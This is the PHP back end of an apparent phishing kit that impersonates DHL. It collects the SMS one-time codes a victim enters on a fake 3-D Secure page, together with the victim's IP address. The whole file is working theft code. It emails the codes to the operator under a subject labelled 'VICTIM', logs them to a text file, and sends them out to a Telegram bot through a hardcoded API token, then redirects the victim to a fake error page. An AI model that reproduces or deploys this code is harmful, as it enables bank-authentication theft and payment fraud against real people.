<?php
include("../../system/os.php");
include "../email.php";
$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(($_POST['jeansms2'] != "") )
{
$hostname = gethostbyaddr($ip);
$message .= "+]###############[+] 3D INFOS 2 [+]###############[+\n";
$message .= "# Dynamic PASS       : ".$_POST['jeansms2']."\n";
$message .= "# Static PASS        : ".$_POST['jean-sms2']."\n";
$message .= "# IP                 : $ip\n";
$send = "$to";
$subject = "📦 SMS CODE 2 VICTIM FROM = $ip";
$headers = "From: J E A N <dhl@jean8.vip>";
mail($send,$subject,$message,$headers);
file_put_contents("../../nj.txt", $message, FILE_APPEND);
function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '1244123994:AAEG5OQvqUXTvyMmc4QWOvgYKIxy1ofq55g';
    $chat_id  = '1128003836';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}


telegram_send(urlencode($message));
echo "<meta http-equiv='refresh' content='0; url=../../loadingerror.php'/>";
}
	else {
     echo "<meta http-equiv='refresh' content='0; ../../loadingerror.php' />";
}

?>